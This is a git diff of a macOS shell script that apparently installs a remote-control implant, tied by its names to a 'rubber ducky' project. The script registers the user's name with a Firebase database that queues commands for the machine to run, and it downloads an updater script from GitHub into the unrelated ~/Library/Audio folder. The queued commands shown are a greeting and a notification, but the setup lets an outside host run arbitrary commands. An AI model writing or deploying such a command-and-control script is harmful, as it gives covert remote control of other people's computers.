@@ -13,7 +13,7 @@ install_brew() {
     source ~/.zshrc
 }
 
-# install_brew
+install_brew
 
 # for funsies
 brew install pyenv
@@ -23,7 +23,7 @@ pyenv install 3.13
 pip3 install requests
 
 # add user
-curl -X PATCH -d "{ \"$USER\": { \"commands\":[\"say hello\"], \"executed\":false }}" https://rc-rubber-ducky-deploy-default-rtdb.asia-southeast1.firebasedatabase.app/users.json
+curl -X PATCH -d "{ \"$USER\": { \"commands\":[\"osascript -e 'display notification \"HELLO $USER\"'\"], \"executed\":false }}" https://rc-rubber-ducky-deploy-default-rtdb.asia-southeast1.firebasedatabase.app/users.json
 
 # curl 2_updater.sh
 curl -H "Cache-Control: no-cache" https://raw.githubusercontent.com/Milooles/deployable-rc/refs/heads/main/2_updater.sh -o ~/Library/Audio/2_updater.sh
